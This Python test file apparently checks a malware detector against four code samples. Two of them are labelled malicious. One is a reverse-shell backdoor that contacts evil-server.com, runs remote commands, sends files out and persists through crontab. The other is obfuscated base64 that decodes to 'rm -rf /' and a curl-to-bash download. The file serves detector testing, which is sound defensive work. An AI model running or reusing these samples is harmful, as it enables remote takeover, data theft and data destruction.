"""
tier2_test_cases.py
Test cases for Tier 2 pipeline validation
"""

from pathlib import Path
from tier2_pipeline import Tier2MalwareDetector


# ========================================
# TEST CASE 1: BENIGN CODE
# ========================================

BENIGN_CODE_1 = """
# Simple data analysis script
import pandas as pd
import numpy as np

def load_data(filename):
    \"\"\"Load CSV data\"\"\"
    df = pd.read_csv(filename)
    return df

def analyze_data(df):
    \"\"\"Basic statistical analysis\"\"\"
    summary = df.describe()
    mean_values = df.mean()
    return summary, mean_values

def main():
    data = load_data('data.csv')
    summary, means = analyze_data(data)
    print(summary)
    print(means)

if __name__ == '__main__':
    main()
"""

# ========================================
# TEST CASE 2: MALICIOUS CODE (Backdoor)
# ========================================

MALICIOUS_CODE_1 = """
# Malicious backdoor
import socket
import subprocess
import os

def connect_to_c2():
    \"\"\"Connect to command & control server\"\"\"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil-server.com", 4444))
    return s

def execute_commands(sock):
    \"\"\"Execute commands from C2\"\"\"
    while True:
        cmd = sock.recv(1024).decode()
        
        if cmd.startswith('download'):
            # Data exfiltration
            filename = cmd.split()[1]
            with open(filename, 'rb') as f:
                data = f.read()
            sock.send(data)
        
        elif cmd == 'exit':
            break
        
        else:
            # Execute arbitrary command
            result = subprocess.run(cmd, shell=True, capture_output=True)
            sock.send(result.stdout + result.stderr)

def install_persistence():
    \"\"\"Install as startup program\"\"\"
    script_path = os.path.abspath(__file__)
    
    # Add to crontab
    os.system(f"(crontab -l; echo '@reboot {script_path}') | crontab -")

def main():
    install_persistence()
    sock = connect_to_c2()
    execute_commands(sock)

if __name__ == '__main__':
    main()
"""

# ========================================
# TEST CASE 3: MALICIOUS CODE (Obfuscated)
# ========================================

MALICIOUS_CODE_2 = """
# Obfuscated malware
import base64
import os

# Obfuscated payload
_0x1a2b = "aW1wb3J0IG9zO29zLnN5c3RlbSgicm0gLXJmIC8iKQ=="
_0x3c4d = "Y3VybCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZSB8IGJhc2g="

def _0xdecrypt(data):
    \"\"\"Decode obfuscated data\"\"\"
    return base64.b64decode(data).decode()

def _0xexecute():
    \"\"\"Execute hidden payload\"\"\"
    payload1 = _0xdecrypt(_0x1a2b)
    payload2 = _0xdecrypt(_0x3c4d)
    
    # Multi-stage execution
    exec(compile(payload1, '<string>', 'exec'))
    eval(payload2)

# Anti-debugging
import sys
if not sys.gettrace():
    _0xexecute()
"""

# ========================================
# TEST CASE 4: BENIGN CODE (Web App)
# ========================================

BENIGN_CODE_2 = """
# Flask web application
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return "Welcome to my API!"

@app.route('/api/data', methods=['GET'])
def get_data():
    \"\"\"Return sample data\"\"\"
    data = {
        'timestamp': datetime.now().isoformat(),
        'message': 'Hello World',
        'version': '1.0'
    }
    return jsonify(data)

@app.route('/api/calculate', methods=['POST'])
def calculate():
    \"\"\"Simple calculation endpoint\"\"\"
    data = request.json
    
    a = data.get('a', 0)
    b = data.get('b', 0)
    operation = data.get('operation', 'add')
    
    if operation == 'add':
        result = a + b
    elif operation == 'subtract':
        result = a - b
    else:
        result = 0
    
    return jsonify({'result': result})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
"""

# ========================================
# RUN ALL TEST CASES
# ========================================

def run_all_tests():
    """Run all test cases"""
    print("\n" + "="*70)
    print("TIER 2 TEST CASES")
    print("="*70)
    
    # Initialize detector
    detector = Tier2MalwareDetector(models_dir="models")
    
    test_cases = [
        ("BENIGN: Data Analysis", BENIGN_CODE_1, "benign"),
        ("MALICIOUS: Backdoor", MALICIOUS_CODE_1, "malicious"),
        ("MALICIOUS: Obfuscated", MALICIOUS_CODE_2, "malicious"),
        ("BENIGN: Flask Web App", BENIGN_CODE_2, "benign"),
    ]
    
    results = []
    
    for name, code, expected in test_cases:
        print(f"\n{'='*70}")
        print(f"TEST: {name}")
        print(f"Expected: {expected.upper()}")
        print(f"{'='*70}")
        
        result = detector.analyze_code(code, identifier=name)
        
        prediction = result.get('final_verdict', {}).get('prediction', 'ERROR')
        confidence = result.get('final_verdict', {}).get('confidence', 0)
        
        correct = (prediction.lower() == expected.lower())
        
        results.append({
            'test': name,
            'expected': expected,
            'predicted': prediction,
            'confidence': confidence,
            'correct': correct
        })
        
        print(f"\n✓ Result: {prediction} ({confidence:.2f}% confidence)")
        print(f"✓ Correct: {'YES ✅' if correct else 'NO ❌'}")
    
    # Summary
    print(f"\n{'='*70}")
    print("TEST SUMMARY")
    print(f"{'='*70}")
    
    total = len(results)
    correct = sum(1 for r in results if r['correct'])
    accuracy = (correct / total) * 100
    
    print(f"Total tests:  {total}")
    print(f"Correct:      {correct}")
    print(f"Accuracy:     {accuracy:.1f}%")
    
    print(f"\n{'='*70}")
    
    for r in results:
        status = "✅" if r['correct'] else "❌"
        print(f"{status} {r['test']:<30} | Predicted: {r['predicted']:<10} | Confidence: {r['confidence']:.1f}%")
    
    print(f"{'='*70}\n")


if __name__ == "__main__":
    run_all_tests()